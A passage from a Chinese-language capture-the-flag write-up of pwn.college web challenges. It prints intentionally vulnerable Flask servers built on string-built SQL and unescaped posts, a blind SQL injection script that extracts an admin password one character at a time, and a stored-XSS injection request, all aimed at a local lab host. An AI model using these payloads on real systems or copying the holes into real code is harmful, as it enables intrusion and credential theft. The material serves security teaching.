<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)  <span class="comment"># 创建一个Flask应用程序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 创建一个临时数据库文件，后缀为 `.db`</span></span><br><span class="line">        self.db_file = tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        <span class="comment"># 连接到SQLite数据库并执行SQL查询</span></span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        connection.row_factory = sqlite3.Row  <span class="comment"># 使用Row工厂，使返回结果可以通过列名访问</span></span><br><span class="line">        cursor = connection.cursor()</span><br><span class="line">        result = cursor.execute(sql, parameters)  <span class="comment"># 执行SQL语句</span></span><br><span class="line">        connection.commit()  <span class="comment"># 提交更改</span></span><br><span class="line">        <span class="keyword">return</span> result  <span class="comment"># 返回查询结果</span></span><br><span class="line"></span><br><span class="line">db = TemporaryDB()  <span class="comment"># 创建TemporaryDB实例，用于执行SQL查询</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># https://www.sqlite.org/lang_createtable.html</span></span><br><span class="line"><span class="comment"># 随机生成一个用户表名</span></span><br><span class="line">user_table = <span class="string">f&quot;users_<span class="subst">&#123;random.randrange(<span class="number">2</span>**<span class="number">32</span>, <span class="number">2</span>**<span class="number">33</span>)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个包含 `admin` 用户的表，表名是随机生成的，并将 flag 作为密码插入</span></span><br><span class="line">db.execute(<span class="string">f&quot;&quot;&quot;CREATE TABLE <span class="subst">&#123;user_table&#125;</span> AS SELECT &quot;admin&quot; AS username, ? as password&quot;&quot;&quot;</span>, [<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read()])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入一个名为 `guest` 的用户，密码为 `password`</span></span><br><span class="line"><span class="comment"># https://www.sqlite.org/lang_insert.html</span></span><br><span class="line">db.execute(<span class="string">f&quot;&quot;&quot;INSERT INTO <span class="subst">&#123;user_table&#125;</span> SELECT &quot;guest&quot; as username, &quot;password&quot; as password&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    <span class="comment"># 从GET请求的参数中获取 `query`，默认值为 `%`，用于模糊匹配所有用户名</span></span><br><span class="line">    query = flask.request.args.get(<span class="string">&quot;query&quot;</span>, <span class="string">&quot;%&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 构造SQL查询，从随机生成的用户表中查询符合条件的用户名</span></span><br><span class="line">        <span class="comment"># https://www.sqlite.org/schematab.html</span></span><br><span class="line">        <span class="comment"># https://www.sqlite.org/lang_select.html</span></span><br><span class="line">        sql = <span class="string">f&#x27;SELECT username FROM <span class="subst">&#123;user_table&#125;</span> WHERE username LIKE &quot;<span class="subst">&#123;query&#125;</span>&quot;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;query=&#125;</span>&quot;</span>)  <span class="comment"># 打印调试信息，输出构造的SQL查询</span></span><br><span class="line">        <span class="comment"># 执行查询并将结果拼接成字符串返回</span></span><br><span class="line">        results = <span class="string">&quot;\n&quot;</span>.join(user[<span class="string">&quot;username&quot;</span>] <span class="keyword">for</span> user <span class="keyword">in</span> db.execute(sql).fetchall())</span><br><span class="line">    <span class="keyword">except</span> sqlite3.Error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果SQL查询出错，返回错误信息</span></span><br><span class="line">        results = <span class="string">f&quot;SQL error: <span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回一个包含查询表单、查询SQL语句（表名被替换为“REDACTED”以隐藏）、查询结果的HTML页面</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;&lt;body&gt;Welcome to the user query service!</span></span><br><span class="line"><span class="string">        &lt;form&gt;Query:&lt;input type=text name=query value=&#x27;<span class="subst">&#123;query&#125;</span>&#x27;&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;b&gt;Query:&lt;/b&gt; &lt;pre&gt;<span class="subst">&#123;sql.replace(user_table, <span class="string">&quot;REDACTED&quot;</span>)&#125;</span>&lt;/pre&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;b&gt;Results:&lt;/b&gt;&lt;pre&gt;<span class="subst">&#123;results&#125;</span>&lt;/pre&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成随机的Flask会话密钥</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置服务器名称</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动Flask应用程序，监听challenge.localhost的80端口</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, <span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-13-SQLi-5"><a href="#3-13-SQLi-5" class="headerlink" title="3.13 SQLi 5"></a>3.13 SQLi 5</h3><p>这个题要实现一个盲注<code>blind injection</code>。具体来说，是构造查询<code>SELECT rowid, * FROM users WHERE username = &quot;admin&quot; AND substr(password, 1, 1) = &#39;a&#39; -- &quot; AND password = &quot;anything&quot;</code>来匹配密码的每一个字符。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment"># 目标 URL</span></span><br><span class="line">url = <span class="string">&quot;http://challenge.localhost:80&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要构造的盲注 payload</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_sql_injection_payload</span>(<span class="params">char_position, char_value</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;admin\&quot; AND SUBSTR(password,<span class="subst">&#123;char_position&#125;</span>,1) = \&quot;<span class="subst">&#123;char_value&#125;</span>\&quot; -- &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于执行盲注并检查响应</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_char_from_password</span>(<span class="params">char_position</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string.printable:</span><br><span class="line">        char_value = char</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 构造 SQL 注入负载</span></span><br><span class="line">        payload = blind_sql_injection_payload(char_position, char_value)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 发送请求</span></span><br><span class="line">        response = requests.post(url, data=&#123;<span class="string">&quot;username&quot;</span>: payload, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;anything&quot;</span>&#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 如果密码匹配，收到一个 302 重定向的响应（假设是成功登录的标志）</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">302</span> <span class="keyword">or</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found character at position <span class="subst">&#123;char_position&#125;</span>: <span class="subst">&#123;char&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> char</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 可选：延时，防止请求太快被检测到（增加盲注的隐蔽性）</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取整个密码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password</span>():</span><br><span class="line">    password = <span class="string">&quot;&quot;</span></span><br><span class="line">    char_position = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 假设密码长度为 60（根据您的要求）</span></span><br><span class="line">    <span class="keyword">while</span> char_position &lt;= <span class="number">60</span>:</span><br><span class="line">        char = get_char_from_password(char_position)</span><br><span class="line">        <span class="keyword">if</span> char:</span><br><span class="line">            password += char</span><br><span class="line">            char_position += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主程序</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Starting to retrieve password...&quot;</span>)</span><br><span class="line">    password = get_password()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Retrieved password: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>server代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)  <span class="comment"># 创建Flask应用程序实例</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 创建一个临时数据库文件，后缀为 `.db`</span></span><br><span class="line">        self.db_file = tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        <span class="comment"># 连接到SQLite数据库并执行SQL查询</span></span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        connection.row_factory = sqlite3.Row  <span class="comment"># 使结果集以字典的形式返回</span></span><br><span class="line">        cursor = connection.cursor()</span><br><span class="line">        result = cursor.execute(sql, parameters)  <span class="comment"># 执行SQL查询并传入参数</span></span><br><span class="line">        connection.commit()  <span class="comment"># 提交事务</span></span><br><span class="line">        <span class="keyword">return</span> result  <span class="comment"># 返回查询结果</span></span><br><span class="line"></span><br><span class="line">db = TemporaryDB()  <span class="comment"># 创建TemporaryDB实例，用于执行SQL查询</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># https://www.sqlite.org/lang_createtable.html</span></span><br><span class="line"><span class="comment"># 创建名为 `users` 的表，包含一条记录，用户名为 `admin`，密码从 `/flag` 文件中读取</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE users AS SELECT &quot;admin&quot; AS username, ? as password&quot;&quot;&quot;</span>, [<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read()])</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://www.sqlite.org/lang_insert.html</span></span><br><span class="line"><span class="comment"># 向 `users` 表中插入第二条记录，用户名为 `guest`，密码为 `password`</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;INSERT INTO users SELECT &quot;guest&quot; as username, &quot;password&quot; as password&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理POST请求，用户通过表单提交用户名和密码进行登录</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_post</span>():</span><br><span class="line">    <span class="comment"># 获取表单中的 `username` 和 `password` 参数</span></span><br><span class="line">    username = flask.request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    password = flask.request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 如果表单缺少 `username` 或 `password` 参数，返回 400 错误</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `username` form parameter&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> password:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `password` form parameter&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># https://www.sqlite.org/lang_select.html</span></span><br><span class="line">        <span class="comment"># 查询数据库，检查 `username` 和 `password` 是否匹配</span></span><br><span class="line">        query = <span class="string">f&#x27;SELECT rowid, * FROM users WHERE username = &quot;<span class="subst">&#123;username&#125;</span>&quot; AND password = &quot;<span class="subst">&#123;password&#125;</span>&quot;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;query=&#125;</span>&quot;</span>)  <span class="comment"># 打印调试信息，输出SQL查询语句</span></span><br><span class="line">        user = db.execute(query).fetchone()  <span class="comment"># 执行查询并获取结果</span></span><br><span class="line">    <span class="keyword">except</span> sqlite3.Error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果SQL查询出错，返回500错误，并显示SQL错误信息</span></span><br><span class="line">        flask.abort(<span class="number">500</span>, <span class="string">f&quot;Query: <span class="subst">&#123;query&#125;</span>\nError: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果没有找到匹配的用户，返回403错误，表示登录失败</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Invalid username or password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果登录成功，将用户名存储在会话中</span></span><br><span class="line">    flask.session[<span class="string">&quot;user&quot;</span>] = username</span><br><span class="line">    <span class="keyword">return</span> flask.redirect(flask.request.path)  <span class="comment"># 重定向到当前路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理GET请求，显示登录表单或欢迎页面</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    <span class="comment"># 检查用户是否已经登录</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (username := flask.session.get(<span class="string">&quot;user&quot;</span>, <span class="literal">None</span>)):</span><br><span class="line">        <span class="comment"># 如果用户没有登录，显示登录表单</span></span><br><span class="line">        page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;Welcome to the login service! Please log in as admin to get the flag.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 如果用户已登录，显示欢迎信息</span></span><br><span class="line">        page = <span class="string">f&quot;&lt;html&gt;&lt;body&gt;Hello, <span class="subst">&#123;username&#125;</span>!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 显示登录表单</span></span><br><span class="line">    <span class="keyword">return</span> page + <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;form method=post&gt;</span></span><br><span class="line"><span class="string">        User:&lt;input type=text name=username&gt;Pass:&lt;input type=text name=password&gt;&lt;input type=submit value=Submit&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成随机的Flask会话密钥</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置服务器名称，监听在 challenge.localhost:80</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动Flask应用程序，监听 challenge.localhost 的80端口</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, <span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-14-XSS-1"><a href="#3-14-XSS-1" class="headerlink" title="3.14 XSS 1"></a>3.14 XSS 1</h3><p>这个挑战是实现一个存储型XSS攻击，通过victim代码我们知道，获取flag需要在get到的数据中有3个<code>&lt;input&gt; textbox</code>、所以我们需要通过server的post方法注入3个<code>&lt;input&gt; textbox</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标 URL</span></span><br><span class="line">url = <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># POST 数据，注入三个输入框</span></span><br><span class="line">data = &#123;<span class="string">&quot;content&quot;</span>: <span class="string">&quot;&lt;input type=&#x27;text&#x27;&gt;&lt;input type=&#x27;text&#x27;&gt;&lt;input type=&#x27;text&#x27;&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Payload injected successfully!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Failed to inject payload.&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>server代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.db_file = tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        connection.row_factory = sqlite3.Row</span><br><span class="line">        cursor = connection.cursor()</span><br><span class="line">        result = cursor.execute(sql, parameters)</span><br><span class="line">        connection.commit()</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">db = TemporaryDB()</span><br><span class="line"><span class="comment"># 创建一个初始的表格和数据</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE posts AS SELECT &quot;First Post!&quot; AS content&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_post</span>():</span><br><span class="line">    content = flask.request.form.get(<span class="string">&quot;content&quot;</span>, <span class="string">&quot;&quot;</span>)  <span class="comment"># 获取表单中的内容</span></span><br><span class="line">    db.execute(<span class="string">&quot;INSERT INTO posts VALUES (?)&quot;</span>, [content])  <span class="comment"># 将内容存储到数据库中</span></span><br><span class="line">    <span class="keyword">return</span> flask.redirect(flask.request.path)  <span class="comment"># 提交后刷新页面</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;\nWelcome to pwnpost, the anonymous posting service. Post away!\n&quot;</span></span><br><span class="line">    page += <span class="string">&quot;&lt;form method=post&gt;Post:&lt;input type=text name=content&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从数据库中获取所有的帖子内容并显示</span></span><br><span class="line">    <span class="keyword">for</span> post <span class="keyword">in</span> db.execute(<span class="string">&quot;SELECT content FROM posts&quot;</span>).fetchall():</span><br><span class="line">        page += <span class="string">&quot;&lt;hr&gt;&quot;</span> + post[<span class="string">&quot;content&quot;</span>] + <span class="string">&quot;\n&quot;</span>  <span class="comment"># 显示帖子的内容（潜在的XSS漏洞）</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page + <span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置Flask应用的密钥和服务器名称</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:80&quot;</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, <span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>victim代码：</p>
